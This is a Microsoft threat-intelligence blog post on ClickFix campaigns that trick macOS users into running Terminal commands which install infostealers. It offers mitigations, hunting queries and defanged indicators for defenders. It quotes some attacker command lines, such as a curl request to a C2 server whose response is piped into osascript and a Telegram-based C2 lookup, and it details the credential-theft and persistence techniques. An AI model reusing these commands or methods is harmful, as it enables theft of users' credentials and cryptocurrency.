---
categories:
- MS
- 보안
date: '2026-05-06T15:20:32+00:00'
description: "In this article\n\t\t\n\n\t\t\n\t\t\t\n\t\t\n\t\n\t\n\t\t\n\t\t\tActivity\
  \ overviewMitigation and protection guidanceHunting queriesIndicators of compromise\t\
  \t\n\t\n\t\n\n\n\n\nMicrosoft researche"
draft: false
original_url: https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/
source: Microsoft Security Blog
tags:
- ClickFix
- macOS
title: ClickFix campaign uses fake macOS utilities lures to deliver infostealers
---

In this article
		

		
			
		
	
	
		
			Activity overviewMitigation and protection guidanceHunting queriesIndicators of compromise		
	
	




Microsoft researchers continue to observe the evolution of an infostealer campaign distributing ClickFix‑style instructions and targeting macOS users. In this recent iteration, threat actors attempt to take advantage of users who are looking for helpful advice on macOS-related issues (for example, optimizing their disk space) in blog sites and other user-driven content platforms by hosting their malicious commands in these sites. 



These commands, which are purported to install system utilities, load an infostealing malware like Macsync, Shub Stealer, and AMOS into the targets’ devices instead. The malware then collects and exfiltrates data, including media files, iCloud data and Keychain entries, and cryptocurrency wallet keys. In some campaigns, the malware replaces legitimate cryptocurrency wallet apps with trojanized versions, putting users at an added security risk.  



Prior iterations of this campaign delivered the infostealers through disk image (.dmg) files that required users to manually install an application. This recent activity reflects a shift in tradecraft, where threat actors instruct users to run Terminal commands that leverage native utilities to retrieve remotely hosted content, followed by script‑based loader execution. 



Unlike application bundles opened through Finder—which might be subjected to Gatekeeper verification checks such as code signing and notarization—scripts downloaded and launched directly through Terminal (for example, by using osascript or shell interpreters) don’t undergo the same evaluation. This delivery mechanism enables attackers to initiate malware execution through user‑driven command invocation, reducing reliance on traditional application delivery methods and increasing the likelihood of successful execution.



In this blog, we take a look at three campaigns that use this new tradecraft. We also provide mitigation guidance and detection details to help surface this threat.



Activity overview



Initial access



Standalone websites were seen hosting pages that included a Base64-encrypted instruction for end users to run. Some sites present this information in multiple languages. As of this writing, these websites that we’ve observed are either already down or have been reported.


Figure 1: Landing page of a script campaign (domenpozh[.]net)


Figure 2. ClickFix instructions hosted on mac-storage-guide.squarespace[.]com.


Figure 3. mac-storage-guide.squarespace[.]com page was seen presenting content in different languages, such as Japanese.



In other instances, content that included instructions leading to malware were observed to be hosted on Craft, a note-taking platform that lets writers and content creators take notes and distribute their content. We’ve observed that pages like macclean[.]craft[.]me were taken down relatively quickly.


Figure 4. ClickFix instruction hosted on macclean[.]craft[.]me.



Threat actors were also publishing fake troubleshooting posts on the popular blogging site Medium to distribute ClickFix instructions. These posts claim to solve common macOS problems. Blog sites such as macos-disk-space[.]medium[.]com instruct users to “fix” an issue by pasting a command into Terminal. The command then decodes and runs an AppleScript or Bash loader. These blogs were reported and taken down quickly.



We observed three distinct execution paths leveraging different infrastructure. We’re classifying these as a loader install campaign, a script install campaign, and a helper install campaign. In the loader and helper campaigns, we observed that a random seven-digit value (hereinafter referred to as random IDs), was used in data staging, marking the staging folders as /tmp/shub_&lt;random ID> or/tmp/&lt;random ID>.



The underlying goal remains the same in these campaigns: sensitive data collection, persistence, and exfiltration.



The following table summarizes the key differences between the campaigns. We discuss the details of each of these campaigns in the succeeding sections of this blog.



Activity or techniqueLoader campaign &nbsp;Script campaignHelper campaignInitial installationNo file written on disk &nbsp;No file written on disk/tmp/helper /tmp/updateCondition to exit executionRussian keyboard detected &nbsp;Failure to resolve an active command-and-control (C2) endpoint (all infrastructure checks fail)Sandbox detectedData staging/tmp/shub_&lt;random ID>/tmp/out.zipNone/tmp/&lt;random ID&gt;/tmp/out.zipPersistence (Plist file created)~/LaunchAgents/com.google.keystone.agent.plist &nbsp;~/LaunchAgents/com.&lt;random value&gt;.plistLibrary/LaunchDaemons/com.finder.helper.plistBot executionPayload: /GoogleUpdateC2 pattern: &lt;C2 domain >/api/bot/heartbeatResolves active C2 through hardcoded infrastructure and Telegram fallback   C2 domain: https://t[.]me/ax03botPayload: /.agentC2 domain: hxxp://45.94.47[.]204/api/Exfiltration&lt;C2 domain&gt;/api/debug/event&lt;C2 domain&gt;/gate/chunk&lt;C2 domain&gt;/upload.php&lt;C2 domain&gt;/contactTrojanized cryptocurrency appsTrezor Suite.appLedger Wallet.appExodus.app&nbsp; Not applicable (handled in later loader/payload stages)Trezor Suite.appLedger Wallet.app



Loader install campaign



Since February 2026, Microsoft researchers have observed a campaign that requests a loader shell from the attacker’s infrastructure using curl once a user copies and runs ClickFix commands using Terminal. It leads to further execution of a second-stage shell script. 



This second shell script is a zsh loader that decodes and decompresses an embedded payload using Base64 and Gzip, respectively. It then executes the payload using eval.


Figure 5: Shell loader.



The next-stage script also functions as a macOS reconnaissance and execution ‑control loader that first fingerprints the system by collecting the following information:




Keyboard locale



Hostname



Operating system version



External IP address




It then builds and sends a JSON object to an attacker‑controlled server containing an event name (loader_requested or cis_blocked) along with this telemetry. It also uses the presence of Russian/CIS keyboard layouts as a deliberate kill switch, reporting a cis_blocked event and stop the execution.


Figure 6: Reconnaissance loader with CIS kill switch.



If the system isn’t blocked, the script silently beacons a “loader requested” event and then downloads and executes a remote AppleScript payload directly in memory using osascript.


Figure 7: Reconnaissance loader with AppleScript payload delivery.



AppleScript infostealer



This multi-stage macOS AppleScript stealer employs user interaction-based credential capture, conducts broad data collection across browsers, Keychains, messaging applications, wallet artifacts, and user documents, and stages the collected data into a compressed archive for exfiltration to a remote endpoint. The malware further tampers with locally installed applications to intercept sensitive data, establishes persistence through a masqueraded LaunchAgent that mimics legitimate software updates, and maintains remote command execution capabilities by periodically polling a server for instructions, which are executed at runtime.



Data collection:  tmp/shub_&lt;random ID> staging



We observed that the stealer self-identifies as “SHub Stealer” (it writes the marker SHub into its staging directory). It prompts the target user to enter their password, pretending to install a &#8220;helper&#8221; utility. It then validates the entered password using the command dscl . -authonly &lt;username&gt;. Upon successful validation, it sends a password_obtained event to its C2 infrastructure.



The malware stages collected data under a /tmp/shub_&lt;random ID&gt;/ folder. The collected data includes:




Browser credentials



Notes



Media files



Telegram data



Cryptocurrency wallets



Keychain entries



iCloud account data




The stealer also collects documents smaller than 2 MB and stages them within a FileGrabber repository located at /tmp/shub_&lt;random ID&gt;/FileGrabber/.



The targeted file types are:




txt



pdf



docx



wallet



key



keys



doc



jpeg



png



kdbx



rtf



jpg



seed




Once the data collection is complete, data is compressed and exfiltrated. The stealer deletes staging artifacts to reduce forensic evidence.



Wallet exfiltration and trojanization



Subsequently, the stealer probes the system for the presence of any of the following cryptocurrency wallet applications:




Electrum



Coinomi



Exodus



Atomic



Wasabi



Ledger Live



Monero



Bitcoin



Litecoin



DashCore



lectrum_LTC



Electron_Cash



Guarda



Dogecoin



Trezor_Suite



Sparrow




When it finds any of these applications, it stages their data for exfiltration.



The stealer was also observed replacing legitimate cryptocurrency wallets apps with attacker-controlled or trojanized ones:




Ledger Wallet.app is replaced by app.zip fetched from &lt;C2 domain>/zxc/app.zip



Trezor suite.app is replaced by apptwo.zip fetched from &lt;C2 domain>/zxc/apptwo.zip



Exodus.app is replaced by appex.zip fetched from &lt;C2 domain>/zxc/appex.zip




These trojanized cryptocurrency wallet applications pose a serious risk to their users who might be unaware of the stealthy compromise and continue to use and transact with them.


Figure 8. Trojanized apps installation.



Persistence



For persistence, the malware creates an additional script within the newly created ~/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/ folder.



A malicious implant named GoogleUpdate is configured to RunAtLoad disguised as an agent. Microsoft Defender Antivirus detects this implant as Trojan:MacOS/SuspMalScript.



A new property list (plist), /Library/LaunchAgents/com.google.keystone.agent.plist,is then staged to run this agent.


Figure 9. Plist staging.



The executable is then given permission to run with the following command:


Figure 10. GoogleUpdate granted permission to run.



Once com.google.keystone.agent.plist loads, it functions as a backdoor-style bot component that registers the infected macOS system with attacker infrastructure at &lt;C2 domain&gt;/api/bot/heartbeat, uniquely identifies the host using a hardware-derived ID, and periodically beacons system metadata such as hostname, operating system version, and external IP address.



The C2 server can return Base64-encoded instructions, which the script decodes and executes locally and deletes traces, enabling remote command execution on demand. This process creates a persistent remote-control channel, where the attacker could push arbitrary shell code to the infected device at any time.


Figure 11. Backdoor style bot with heartbeat driven payload execution.



Script install campaign



In April 2026, Microsoft researchers observed an ongoing campaign that runs a heavily obfuscated infostealer when users run it through Terminal.



The attack begins with a social‑engineering instruction containing a Base64‑encoded command.



When decoded, this instruction resolves a one‑line shell pipeline that retrieves a remote script, which is then handed off immediately for execution. By encoding the command and streaming its output directly into the shell, the attacker avoids placing a recognizable payload on disk during the initial stage.


Figure 12. Payload delivery.



The retrieved script.sh payload is launched directly from the network stream, with no intermediate file written to disk. It’s responsible for establishing persistence and deploying follow-on functionality. It delivers the second-stage Base64 encoded script under a plist staged at ~/Library/LaunchAgent/com.&lt;random name&gt;.plist.


Figure 13. Payload staged into a plist.



The persisted AppleScript is heavily obfuscated in its original form (character ID concatenation). After decoding, the key logic follows:


Figure 14. AppleScript stager (decoded).



This AppleScript functions as a C2 discovery and execution orchestrator for a macOS malware campaign. The AppleScript is used as the control layer and standard Unix tools for network interaction and execution. Its first role is C2 discovery. It iterates over a list of potential server identifiers (for example {0x666[.]info}), constructs candidate URLs (http://&lt;value&gt;/), and probes them using curl with a realistic Chrome macOS user agent and a benign POST body (-d &#8220;check&#8221;). This connectivity test is performed through the following command:



/usr/bin/curl -s -H &#8220;&lt;User-Agent&gt;&#8221; -d &#8220;check&#8221; &#8211;connect-timeout 5 &#8211;max-time 10 &lt;candidate_url&gt;


Figure 15. Initial C2 communication.



If none of the hard‑coded infrastructure responds successfully, the script falls back to Telegram‑based C2 discovery. It fetches a Telegram bot page using curl -s hxxps://t[.]me/ax03bot and extracts a hidden server identifier embedded in an HTML &lt;span dir=&#8221;auto&#8221;&gt; element using sed. This lets the attacker rotate C2 infrastructure dynamically.


Figure 16. Telegram-based C2 endpoint discovery.



Once a working C2 endpoint is identified, the script moves into execution orchestration. It sends a final POST request to the resolved server containing a transaction ID (txid) and module identifier, then immediately pipes the server response into osascript for execution:



curl -s -X POST &lt;C2_URL&gt; -H &#8220;&lt;User-Agent&gt;&#8221; -d &#8220;&lt;txid&gt;&amp;module&#8221; | osascript



This command enables arbitrary AppleScript execution directly from the server, fully in memory, with no payload written to disk. Output and errors are suppressed, and execution only proceeds if all connectivity checks succeed. Overall, this isn’t a simple downloader but a resilient, infrastructure‑aware loader designed to dynamically discover C2 endpoints, evade takedowns, and execute attacker‑controlled AppleScript logic on demand.



We observed data exfiltration to the attacker&#8217;s infrastructure on a C2/upload.php endpoint leveraging curl.


Figure 17. Exfiltration of archived data.



Helper install campaign (AMOS)



Starting at the end of January 2026 , another ClickFix campaign relied on an executable file named helper or update to run. In this campaign, once a user ran the encoded ClickFix instructions, a first-stage script decoded a Base64 payload and then decompressed the payload using Gunzip.


Figure 18. First-stage script requested.



The first-stage script led to the retrieval of the second stage-malicious Mach Object (Mach-O) executable into the newly created /tmp/&lt;file name> folder.



Figure 19. /tmp/helper installation.



In February 2026, this campaign retrieved the payload under a /tmp/update folder.


Figure 20. /tmp/update installation.



This malicious executable file has its extended properties removed and is then given permission to run and launch on the victim’s device.



Virtualization detection



The infection chain begins with an AppleScript based stager that uses array subtraction obfuscation to conceal its strings and commands. This stager performs an anti-analysis gate by invoking system_profiler and inspecting both memory and hardware profiles. Specifically, it searches for common virtualization indicators such as QEMU, VMware, and KVM. In addition to explicit hypervisor vendor strings, the script also checks for a set of generic hardware artifacts commonly observed in virtualized or analysis environments, including:




Chip: Unknown



Intel Core 2



Virtual Machine



VirtualMac




If any of these indicators are present, execution is terminated early, preventing further stages from running.



Data collection and exfiltration



Like the loader install campaign, the stealer prompts the user to enter their password. It validates locally whether the entered password is correct using dscl utility.



After capturing the target user’s password, the malware then focuses on stealing high-value credentials and financial artifacts. It copies macOS Keychain databases, enabling access to stored website passwords, application secrets, and WiFi credentials.



It also collects browser authentication material from Chromium‑based browsers, including saved usernames and passwords, session cookies, autofill data, and browser profile state that can be reused for account takeover. In addition, the script targets cryptocurrency wallets, copying data associated with both browser‑based and desktop wallets. This includes browser extensions such as MetaMask and Phantom, as well as desktop wallets including Exodus and Electrum.



&nbsp;The stealer compresses collected data into a ZIP file /tmp.out.zip, which is then exfiltrated to a &lt;C2 domain&gt;/contact&gt; endpoint. The stealer removes staging artifacts to reduce forensic evidence.





Figure 21. Archiving and exfiltration of data.



Wallet exfiltration and trojanization



Similar to the loader campaign, the stealer in the helper also replaces legitimate wallet apps with attackers-controlled ones:




Ledger Wallet.app is replaced by app.zip fetched from &lt;C2 domain>/zxc.app.zip.



Trezor suite.app is replaced by apptwo.zip fetched from &lt;C2 domain>/zxc/apptwo.zip




Backdoor deployment and persistence



To maintain long‑term access to infected systems, the helper campaign deploys a multi‑stage persistence mechanism built around two cooperating components: a primary backdoor binary and a lightweight execution wrapper.



Download and execution of the backdoor component (.mainhelper)



The persistence chain begins with the download of a second‑stage backdoor implant named .mainhelper into the current user’s home directory. As shown in Figure 22, the obfuscated AppleScript issues a network retrieval command that fetches this Mach‑O executable from an attacker-controlled endpoint (&lt;C2 domain&gt;/zxc/kito) and writes it as a hidden file under the user profile.


Figure 22. Second implant downloaded.



Once it’s given attributes and permissions to run, the /.mainhelper implant joins the compromised device to a C2 endpoint hxxp://45.94.47[.]204/api/. The implant executes tasks from the attacker, providing a remote-control capability to the attacker on the compromised system.


Figure 23. C2 instance.



Creation of the execution wrapper (.agent)



In addition to the backdoor binary, the stealer creates a secondary file named .agent, also placed in the user’s home directory. Unlike .mainhelper, .agent isn’t a full implant. Instead, it is a lightweight shell wrapper whose sole purpose is to launch and supervise the .mainhelper process. The script writes the wrapper to disk and configures it so that, if the backdoor process terminates or crashes, .agent relaunches it.



LaunchDaemon installation (com.finder.helper.plist)



After prompting the victim for their macOS password and validating it, the script escalates privileges to establish system-level persistence. It constructs a LaunchDaemon plist, stages the XML content to a temporary file (/tmp/starter), and then writes it to /Library/LaunchDaemons/com.finder.helper.plist.



LaunchDaemon plist staging and loading



LaunchDaemon is configured to run /bin/bash with the path to ~/.agent as its argument, rather than invoking the backdoor binary directly. As shown in Figure 25, the script sets correct ownership, loads the daemon using launchctl, and enables both RunAtLoad and KeepAlive.


Figure 24. Plist staging.



As a result, on every system boot, launchd runs the .agent wrapper with root privileges, which in turn ensures that the .mainhelper backdoor process is running.


Figure 25. Plist loading.



Mitigation and protection guidance



Apple Xprotect has updated signatures to protect users against this threat. Additionally, in macOS 26.4 and later, Apple has introduced a mitigation that directly addresses the ClickFix delivery mechanism. 







When a user attempts to paste a potentially malicious command into Terminal, they will now see the following prompt:



Possible malware, Paste blocked



Your Mac has not been harmed. Scammers often encourage pasting text into Terminal to try and harm your Mac or compromise your privacy. These instructions are commonly offered via websites, chat agents, apps, files, or a phone call.







Organizations can also follow these recommendations to mitigate threats associated with this threat:




Educate users. Warn them against running instructions from untrusted sources.



Monitor Terminal usage. Alert on suspicious Terminal or shell sessions spawned by installers or user apps.



Detect native tool abuse. Flag unusual sequences of macOS utilities (curl, Base64, Gunzip, osascript, and dscl).



Inspect outbound downloads. Monitor curl activity fetching encoded or compressed payloads from unknown domains.



Protect credential stores. Detect unauthorized access to keychain items, browser data, SSH keys, and cloud credentials.



Monitor data staging. Alert on archive creation of sensitive artifacts followed by HTTP POST exfiltration.



Enable endpoint protection. Ensure macOS endpoint detection and response (EDR) or extended detection and response (XDR) monitors script execution and living‑off‑the‑land behavior.



Restrict C2 traffic. Block outbound connections to suspicious or newly registered domains.




Microsoft also recommends the following mitigations to reduce the impact of this threat.




Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown threats.



Run EDR in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your antivirus does not detect the threat or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-breach.



Allow investigation and remediation in full automated mode to allow Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume.



Turn on tamper protection features to prevent attackers from stopping security services. Combine tamper protection with the DisableLocalAdminMerge setting to mitigate attackers from using local administrator privileges to set antivirus exclusions.




Microsoft Defender detections



Microsoft Defender customers can refer to the list of applicable detections below. Microsoft Defender coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.



Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.



TacticObserved activityMicrosoft Defender coverageExecutionUser copies, pastes, and runs Base64 instructions Base64 instructions are deobfuscated Executable files are created from remote attacker’s infrastructureInstalled malware implant is executed Malicious AppleScript is retrieved from attacker infrastructureSequence of malicious instructions are executedMicrosoft Defender for Endpoint Suspicious shell command executionObfuscation or deobfuscation activityExecutable permission added to file or directorySuspicious launchctl tool activity&#8216;SuspMalScript&#8217; malware was preventedPossible AMOS stealer Activity Suspicious AppleScript activitySuspicious piped command launchedSuspicious file or information obfuscation detected Microsoft Defender Antivirus Trojan:MacOS/Multiverze – Created executable file Trojan:MacOS/SuspMalScript – Malware implant downloaded by the loader campaignBehavior:MacOS/SuspAmosExecution – Malicious file executionBehavior:MacOS/SuspOsascriptExec – Malicious osascript executionBehavior:MacOS/SuspDownloadFileExec – Suspicious file download and executionBehavior:MacOS/SuspiciousActiviyGen  Data collectionMalware collects data from bash history, browser credentials, and other sensitive foldersMultiple files are collected into staging foldersCollected data is staged and archived into a folder Staging folders are removedMicrosoft Defender for EndpointSuspicious access of sensitive filesSuspicious process collected data from local systemEnumeration of files with sensitive dataSuspicious archive creationSuspicious path deletion   Microsoft Defender Antivirus Behavior:MacOS/SuspPassSteal – Suspicious process collected data from local systemTrojan:MacOS/SuspDecodeExec – Malicious plist detectionDefense evasionMalware deletes the staging paths following exfiltrationExecution of obfuscated code to evade inspection &nbsp;Microsoft Defender for Endpoint &nbsp; Suspicious path deletionSuspicious file or information obfuscation detected &nbsp;Credential accessMalware steals user account credential and stages files for exfiltrationMicrosoft Defender for Endpoint Suspicious access of sensitive filesUnix credentials were illegitimately accessed &nbsp;ExfiltrationMalware exfiltrates staged data using curl and HTTP POSTMicrosoft Defender for Endpoint Possible data exfiltration using curl   Microsoft Defender Antivirus Behavior:MacOS/SuspInfoExfilTrojan:MacOS/SuspMacSyncExfil



Threat intelligence reports



Microsoft Defender customers can use the following threat analytics reports in the Defender portal (requires license for at least one Defender product) to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to help prevent, mitigate, or respond to associated threats found in customer environments.



Microsoft Defender threat analytics



From ClickFix to code signed: the quiet shift of MacSync Stealer malware.



Microsoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the embedded experience in the Microsoft Defender portal to get more information about this threat actor.



Hunting queries



Microsoft Defender



Microsoft Defender customers can run the following queries to find related activity in their networks:



Initial access 



//Loader campaign installation
DeviceNetworkEvents
| where InitiatingProcessCommandLine has_any ("loader.sh?build=","payload.applescript?build=")

// Helper campaign installation
DeviceFileEvents
| where InitiatingProcessCommandLine  has_all("curl", "/tmp/helper","-o")

//Install of /update install campaign
DeviceFileEvents
| where InitiatingProcessCommandLine  has_all("curl", "/tmp/update","-o")
| where FileName== "update"



Exfiltration to C2 infrastructure



//loader campaign

DeviceProcessEvents
| where ProcessCommandLine has_all("curl", "post","/debug/event", "build_hash")

DeviceProcessEvents
| where ProcessCommandLine  has_all("curl","/tmp","post","-H","-f","build","/gate")
| where not (ProcessCommandLine has_any(".claude/shell-snapshots")) 

//script campaign 

DeviceNetworkEvents
| where InitiatingProcessCommandLine has_all ("curl","-F","txid","zip","max-time")

//helper campaign
DeviceProcessEvents
| where InitiatingProcessCommandLine has_all ("curl","post","-H","user","buildid","cl","cn","/tmp/")



Bot C2 installation and communication



//loader campaign - bot install
DeviceFileEvents
| where InitiatingProcessCommandLine =="base64 -d"
| where FolderPath endswith @"Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate"

//loader campaign – bot communication
DeviceProcessEvents
 | where ProcessCommandLine  has_all("/api/bot/heartbeat","post","curl")

//script campaign second stage execution 
DeviceProcessEvents
 | where ProcessCommandLine  has_all("curl","POST","txid","osascript","bmodule","max-time")

//helper campaign - bot install 

//Alternate query for helper or bot update installation
DeviceFileEvents
| where  InitiatingProcessCommandLine has_all ("curl","zxc","kito")

DeviceProcessEvents
| where InitiatingProcessFileName =="osascript"
| where  ProcessCommandLine  has_all ("sh","echo","-c", "cp","/tmp/starter",".plist")



Indicators of compromise



Domains distributing ClickFix



IndicatorTypeDescriptioncleanmymacos[.]orgDomainDistribution of ClickFix&nbsp; instructionsmac-storage-guide.squarespace[.]comDomainDistribution of ClickFix instructions&nbsp;claudecodedoc[.]squarespace[.]comDomainDistribution of ClickFix instructions&nbsp;domenpozh[.]netDomainDistribution of ClickFix instructions&nbsp; &nbsp;macos-disk-space[.]medium[.]comDomainDistribution of ClickFix instructions&nbsp; &nbsp;macclean[.]craft[.]meDomain&nbsp;Distribution of ClickFix instructionsapple-mac-fix-hidden[.]medium[.]comDomainDistribution of ClickFix instructions&nbsp;



Loader campaign



IndicatorTypeDescriptionrapidfilevault4[.]sbsDomainPayload delivery and C2coco-fun2[.]comDomainPayload delivery and C2nitlebuf[.]comDomainPayload delivery and C2yablochnisok[.]comDomainPayload delivery and C2mentaorb[.]comDomainPayload delivery and C2seagalnssteavens[.]comDomainPayload delivery and C2res2erch-sl0ut[.]comDomainPayload delivery and C2filefastdata[.]comDomainPayload delivery and C2metramon[.]comDomainPayload delivery and C2octopixeldate[.]comDomainPayload delivery and C2pewweepor092[.]comDomainPayload delivery and C2bulletproofdomai2n[.]comDomainPayload delivery and C2benefasts-fhgs2[.]comDomainPayload delivery and C2repqoow77wiqi[.]comDomainPayload delivery and C2do2wers[.]comDomainPayload delivery and C2rapidfilevault4[.]cyouDomainPayload delivery and C2reews09weersus[.]comDomainPayload delivery and C2pepepupuchek13[.]comDomainPayload delivery and C2pewqpeee888[.]comDomainPayload delivery and C2wewannaliveinpicede[.]comDomainPayload delivery and C2datasphere[.]us[.]comDomainPayload delivery and C2rapidfilevault5[.]sbsDomainPayload delivery and C2coco2-hram[.]comDomainPayload delivery and C2poeooeowwo777[.]comDomainPayload delivery and C2korovkamu[.]comDomainPayload delivery and C2metrikcs[.]comDomainPayload delivery and C2metlafounder[.]comDomainPayload delivery and C2terafolt[.]comDomainPayload delivery and C2haploadpin[.]comDomainPayload delivery and C2rawmrk[.]comDomainPayload delivery and C2mikulatur[.]comDomainPayload delivery and C2milbiorb[.]comDomainPayload delivery and C2doqeers[.]comDomainPayload delivery and C2we2luck[.]comDomainPayload delivery and C2quantumdataserver5[.]homesDomainPayload delivery and C2bintail[.]comDomainPayload delivery and C2molokotarelka[.]comDomainPayload delivery and C2trehlub[.]comDomainPayload delivery and C2avafex[.]comDomainPayload delivery and C2rhymbil[.]comDomainPayload delivery and C2boso6ka[.]comDomainPayload delivery and C2res2erch-sl2ut[.]comDomainPayload delivery and C2pilautfile[.]comDomainPayload delivery and C2bigbossbro777[.]comDomainPayload delivery and C2miappl[.]comDomainPayload delivery and C2peloetwq71[.]comDomainPayload delivery and C2fastfilenext[.]comDomainPayload delivery and C2beransraol[.]comDomainPayload delivery and C2pelorso90la[.]comDomainPayload delivery and C2medoviypirog[.]comDomainPayload delivery and C2wewannaliveinpice[.]comDomainPayload delivery and C2malkim[.]comDomainPayload delivery and C2pipipoopochek6[.]comDomainPayload delivery and C2hello-brothers777[.]comDomainPayload delivery and C2dialerformac[.]comDomainPayload delivery and C2persaniusdimonica8[.]comDomainPayload delivery and C2hilofet[.]comDomainPayload delivery and C2tmcnex[.]comDomainPayload delivery and C2nibelined[.]comDomainPayload delivery and C2pissispissman[.]comDomainPayload delivery and C2bankafolder[.]comDomainPayload delivery and C2perewoisbb0[.]comDomainPayload delivery and C2us41web[.]liveDomainPayload delivery and C2uk176video[.]liveDomainPayload delivery and C2jihiz[.]comDomainPayload delivery and C2beltoxer[.]comDomainPayload delivery and C2swift-sh[.]comDomainPayload delivery and C2hitkrul[.]comDomainPayload delivery and C2kofeynayagush[.]comDomainPayload delivery and C2 &nbsp;



Script campaign



IndicatorTypeDescriptionhxxps://cauterizespray[.]icu/script[.]shURLPayload deliveryhxxps://enslaveculprit[.]digital/script[.]shURLPayload deliveryhxxps://resilientlimb[.]icu/script[.]shURLPayload deliveryhxxps://thickentributary[.]digital/script[.]sh &nbsp;URLPayload deliveryhxxp://paralegalmustang[.]icu/script[.]shURL &nbsp;Payload delivery &nbsp;hxxps://round5on[.]digital/script[.]sh &nbsp;URLPayload delivery &nbsp;hxxps://qjywvkbl[.]degassing-mould[.]digitalURLPayload delivery &nbsp;hxxps://zg5mkr7q[.]apexharvestor[.]digitalURLPayload delivery &nbsp;hxxps://kvrnjr30[.]apexharvestor[.]digitalURLPayload delivery &nbsp;hxxps://yygp4pdh[.]apexharvestor[.]digital &nbsp;URLPayload delivery &nbsp;hxxps://t[.]me/ax03botURLPayload delivery &nbsp;0x666[.]infoDomainPayload delivery, C2, and exfiltrationhonestly[.]inkDomain &nbsp;Payload delivery, C2, and exfiltration95.85.251[.]177&nbsp;IP addressPayload delivery, C2, and exfiltrationpla7ina[.]cfdDomainPayload delivery, C2, and exfiltrationplay67[.]ccDomainPayload delivery, C2, and exfiltration



Helper campaign



Indicator&nbsp;Type&nbsp;Description&nbsp;rvdownloads[.]com&nbsp;&nbsp;Domain&nbsp;Payload delivery&nbsp;famiode[.]com&nbsp;&nbsp;Domain&nbsp;Payload delivery&nbsp;contatoplus[.]com&nbsp;&nbsp;Domain&nbsp;Payload delivery&nbsp;woupp[.]com&nbsp;&nbsp;Domain&nbsp;Payload delivery&nbsp;saramoftah[.]com&nbsp;&nbsp;Domain&nbsp;Payload delivery&nbsp;ptrei[.]com&nbsp;&nbsp;Domain&nbsp;Payload delivery&nbsp;wriconsult[.]com&nbsp;&nbsp;Domain&nbsp;Payload delivery&nbsp;kayeart[.]com&nbsp;&nbsp;Domain&nbsp;Payload delivery&nbsp;ejecen[.]com&nbsp;&nbsp;Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload delivery&nbsp;stinarosen[.]com&nbsp;&nbsp;Domain&nbsp;Payload delivery&nbsp;biopranica[.]com&nbsp;&nbsp;Domain&nbsp;&nbsp;&nbsp;Payload delivery&nbsp;raxelpak[.]com&nbsp;&nbsp;Domain&nbsp;&nbsp;&nbsp;Payload delivery&nbsp;octopox[.]com&nbsp;&nbsp;Domain&nbsp;&nbsp;&nbsp;Payload delivery&nbsp;boosterjuices[.]com&nbsp;Domain&nbsp;&nbsp;&nbsp;Payload delivery&nbsp;ftduk[.]comDomainPayload delivery&nbsp;dryvecar[.]comDomainPayload delivery&nbsp;vcopp[.]comDomainPayload delivery&nbsp;kcbps[.]comDomainPayload delivery&nbsp;jpbassin[.]comDomainPayload delivery&nbsp;isgilan[.]comDomain&nbsp;&nbsp;Payload deliveryarkypc[.]comDomain&nbsp;&nbsp;Payload deliveryhacelu[.]comDomainPayload delivery&nbsp;stclegion[.]comDomainPayload deliveryxeebii[.]com &nbsp;DomainPayload deliveryhxxp://138.124.93[.]32/contact&nbsp;&nbsp;URL&nbsp;Exfiltration endpoint&nbsp;hxxp://168.100.9[.]122/contact&nbsp;&nbsp;URL&nbsp;Exfiltration endpointhxxp://199.217.98[.]33/contact&nbsp;&nbsp;URL&nbsp;Exfiltration endpointhxxp://38.244.158[.]103/contact&nbsp;&nbsp;URL&nbsp;Exfiltration endpointhxxp://38.244.158[.]56/contact&nbsp;&nbsp;URL&nbsp;Exfiltration endpointhxxp://92.246.136[.]14/contact&nbsp;&nbsp;URL&nbsp;Exfiltration endpointhxxps://avipstudios[.]com/contact&nbsp;&nbsp;URL&nbsp;Exfiltration endpointhxxps://joytion[.]com/contact&nbsp;&nbsp;URL&nbsp;Exfiltration endpointhxxps://laislivon[.]com/contact&nbsp;&nbsp;URL&nbsp;Exfiltration endpointhxxps://mpasvw[.]com/contactURLExfiltration endpointhxxps[://]lakhov[.]com/contactURLExfiltration endpoint



Update campaign infrastructure



IndicatorTypeDescriptionreachnv[.]comDomainDelivery of the update install variant of the helper campaignvagturk[.]comDomain &nbsp;Delivery of the update install variant of the helper campaign &nbsp;futampako[.]comDomain &nbsp;Delivery of the update install variant of the helper campaign &nbsp;octopox[.]comDomain &nbsp;Delivery of the update install variant of the helper campaign &nbsp;lbarticle[.]comDomain &nbsp;Delivery of the update install variant of the helper campaign &nbsp;raytherrien[.]comDomain &nbsp;Delivery of the update install variant of the helper campaign &nbsp;joeyapple[.]comDomain &nbsp;Delivery of the update install variant of the helper campaign &nbsp;



Persistence and bot execution



IndicatorTypeDescription45.94.47[.]204IP addressBot communication IP addresswusetail[.]comDomainHosting bot payload&nbsp;aforvm[.]comDomain&nbsp;Hosting bot payloadouilov[.]com&nbsp;DomainHosting bot payload&nbsp;malext[.]comDomainHosting bot payloadrebidy[.]comDomainHosting bot payload



Payloads



